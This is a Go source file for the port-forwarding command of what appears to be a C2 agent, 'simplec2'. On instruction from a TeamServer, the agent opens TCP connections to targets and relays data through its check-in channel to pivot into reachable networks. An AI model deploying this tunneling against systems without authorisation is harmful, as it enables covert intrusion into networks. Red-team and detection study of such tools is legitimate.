package command

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"simplec2/pkg/bridge" // Import bridge package
)

// CommandIDPortFwd Port Forward 命令 ID
const CommandIDPortFwd uint32 = 16

// TunnelCommandType 定义隧道命令类型
type TunnelCommandType string

const (
	TunnelCommandStart TunnelCommandType = "start"
	TunnelCommandData  TunnelCommandType = "data"
	TunnelCommandStop  TunnelCommandType = "stop"
)

// PortFwdArgs 定义 Port Fwd 命令的参数
type PortFwdArgs struct {
	Command   TunnelCommandType `json:"command"`     // start, data, stop
	TunnelID  string            `json:"tunnel_id"`   // Unique ID for the tunnel
	Target    string            `json:"target"`      // target_ip:target_port for start command
	Data      []byte            `json:"data"`        // Data chunk for data command
	IsFin     bool              `json:"is_fin"`      // Indicates end of stream/connection close
	IsError   bool              `json:"is_error"`    // Indicates an error occurred on the tunnel
	ErrorMsg  string            `json:"error_msg"`   // Error message if IsError is true
}

// TunnelEntry 存储活跃隧道的信息
type TunnelEntry struct {
	Conn net.Conn
	// Channel to queue data coming from TeamServer to the Conn
	Inbound chan []byte
	// Channel to signal connection close
	Close chan struct{}
	// Context for managing the tunnel goroutine lifecycle
	Ctx    context.Context
	Cancel context.CancelFunc
}

// Global map to manage active tunnels
var activeTunnels = make(map[string]*TunnelEntry)
var tunnelsMutex sync.Mutex

// Getter for activeTunnels (used by main.go)
func GetActiveTunnel(tunnelID string) (*TunnelEntry, bool) {
	tunnelsMutex.Lock()
	defer tunnelsMutex.Unlock()
	entry, ok := activeTunnels[tunnelID]
	return entry, ok
}

// Getter for activeTunnels map length (used by main.go)
func GetActiveTunnelCount() int {
	tunnelsMutex.Lock()
	defer tunnelsMutex.Unlock()
	return len(activeTunnels)
}

// Global channel for outgoing tunnel messages (agent -> TeamServer)
var outgoingTunnelQueue chan *bridge.TunnelMessage

// SetOutgoingTunnelQueue sets the global queue for tunnel messages.
// This is called by main.go during initialization.
func SetOutgoingTunnelQueue(queue chan *bridge.TunnelMessage) {
	outgoingTunnelQueue = queue
}


// PortFwdCommand implements the port forwarding command.
type PortFwdCommand struct{}

func init() {
	Register(&PortFwdCommand{})
}

func (c *PortFwdCommand) ID() uint32 {
	return CommandIDPortFwd
}

func (c *PortFwdCommand) Name() string {
	return "portfwd"
}

func (c *PortFwdCommand) Execute(task *Task) ([]byte, error) {
	var args PortFwdArgs
	if err := json.Unmarshal(task.Arguments, &args); err != nil {
		return nil, fmt.Errorf("failed to parse portfwd arguments: %v", err)
	}

	tunnelsMutex.Lock()
	defer tunnelsMutex.Unlock()

	switch args.Command {
	case TunnelCommandStart:
		return handlePortFwdStart(args.TunnelID, args.Target)
	case TunnelCommandData:
		return handlePortFwdData(args.TunnelID, args.Data, args.IsFin)
	case TunnelCommandStop:
		return handlePortFwdStop(args.TunnelID)
	default:
		return nil, fmt.Errorf("unknown portfwd command: %s", args.Command)
	}
}

// handlePortFwdStart initiates a TCP connection to the target.
func handlePortFwdStart(tunnelID, target string) ([]byte, error) {
	if _, exists := activeTunnels[tunnelID]; exists {
		return nil, fmt.Errorf("tunnel ID %s already exists", tunnelID)
	}

	conn, err := net.Dial("tcp", target)
	if err != nil {
		return nil, fmt.Errorf("failed to dial target %s: %v", target, err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	entry := &TunnelEntry{
		Conn:    conn,
		Inbound: make(chan []byte, 10), // Buffer inbound data
		Close:   make(chan struct{}),
		Ctx:     ctx,
		Cancel:  cancel,
	}
	activeTunnels[tunnelID] = entry

	// Start goroutine to read from target and queue data for TeamServer
	go readFromTunnel(tunnelID, entry)
	// Start goroutine to write data from TeamServer to tunnel
	go writeToTunnel(tunnelID, entry)


	return []byte(fmt.Sprintf("Tunnel %s started to %s", tunnelID, target)), nil
}

// readFromTunnel reads data from the established connection and sends it back to the TeamServer via the check-in mechanism.
func readFromTunnel(tunnelID string, entry *TunnelEntry) {
	defer func() {
		entry.Conn.Close()
		tunnelsMutex.Lock()
		delete(activeTunnels, tunnelID)
		tunnelsMutex.Unlock()
		close(entry.Inbound) // Close inbound channel
		entry.Cancel()       // Signal writeToTunnel to exit
	}()

	buffer := make([]byte, 4096)
	for {
		select {
		case <-entry.Ctx.Done(): // Context cancelled, tunnel is closing
			sendTunnelMessage(tunnelID, nil, true, false, "Tunnel closed by agent context")
			return
		default:
			entry.Conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
			n, err := entry.Conn.Read(buffer)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue // Timeout, try again
				}
				// Connection closed or error, signal TeamServer and return
				sendTunnelMessage(tunnelID, nil, true, true, err.Error()) // is_fin=true, is_error=true
				return
			}
			if n > 0 {
				sendTunnelMessage(tunnelID, buffer[:n], false, false, "")
			}
		}
	}
}

// writeToTunnel reads data from the Inbound channel and writes it to the tunnel connection.
func writeToTunnel(tunnelID string, entry *TunnelEntry) {
	for {
		select {
		case <-entry.Ctx.Done(): // Context cancelled, tunnel is closing
			return
		case data := <-entry.Inbound:
			_, err := entry.Conn.Write(data)
			if err != nil {
				log.Printf("Error writing to tunnel %s: %v", tunnelID, err)
				sendTunnelMessage(tunnelID, nil, false, true, err.Error())
				return
			}
		}
	}
}


// handlePortFwdData writes data received from TeamServer to the tunnel connection.
// In main.go, this will be handled by pushing data to TunnelEntry.Inbound channel.
func handlePortFwdData(tunnelID string, data []byte, isFin bool) ([]byte, error) {
	// This function is mostly a placeholder for the Execute() method,
	// the actual data dispatching will happen in main.go's dispatchIncomingTunnelMessages.
	// However, this Execute method is called by the command dispatcher for a `portfwd` task.
	// So, a `DATA` command task means that the TeamServer wants us to inject data.

	entry, exists := activeTunnels[tunnelID]
	if !exists {
		return nil, fmt.Errorf("tunnel ID %s not found", tunnelID)
	}

	if isFin {
		// TeamServer signals end of stream for this direction
		entry.Cancel() // Close the context for this tunnel
		return []byte(fmt.Sprintf("Tunnel %s signaled to close", tunnelID)), nil
	}

	// For data, push to inbound channel (handled by writeToTunnel goroutine)
	select {
	case entry.Inbound <- data:
		return []byte(fmt.Sprintf("Data queued for tunnel %s", tunnelID)), nil
	case <-time.After(1 * time.Second): // Prevent blocking indefinitely
		return nil, fmt.Errorf("failed to queue data for tunnel %s: inbound channel full", tunnelID)
	}
}


// handlePortFwdStop closes the tunnel connection and cleans up.
func handlePortFwdStop(tunnelID string) ([]byte, error) {
	entry, exists := activeTunnels[tunnelID]
	if !exists {
		return nil, fmt.Errorf("tunnel ID %s not found", tunnelID)
	}
	entry.Cancel() // Signal both readFromTunnel and writeToTunnel to exit
	return []byte(fmt.Sprintf("Tunnel %s stopped", tunnelID)), nil
}

// SignalTunnelClose provides a way for main.go to signal a tunnel to close.
func SignalTunnelClose(tunnelID string) {
	tunnelsMutex.Lock()
	defer tunnelsMutex.Unlock()
	if entry, exists := activeTunnels[tunnelID]; exists {
		entry.Cancel()
	}
}

// SendTunnelError sends an error message for a specific tunnel to the TeamServer.
func SendTunnelError(tunnelID, errorMsg string, isFin bool) {
	sendTunnelMessage(tunnelID, nil, isFin, true, errorMsg)
}

// sendTunnelMessage is a helper to push outgoing tunnel messages to the global queue.
func sendTunnelMessage(tunnelID string, data []byte, isFin, isError bool, errorMsg string) {
	msg := &bridge.TunnelMessage{
		TunnelId:    tunnelID,
		Data:        data,
		IsFin:       isFin,
		IsError:     isError,
		ErrorMsg:    errorMsg,
		CommandType: bridge.TunnelMessage_DATA, // Default to DATA command type
	}
	if isFin && isError {
		msg.CommandType = bridge.TunnelMessage_STOP
	} else if isFin {
		msg.CommandType = bridge.TunnelMessage_STOP
	}
	
	select {
	case outgoingTunnelQueue <- msg:
		// Message sent to queue
	case <-time.After(50 * time.Millisecond): // Non-blocking send
		log.Printf("Warning: Failed to send tunnel message to queue for tunnel %s, queue full", tunnelID)
	}
}
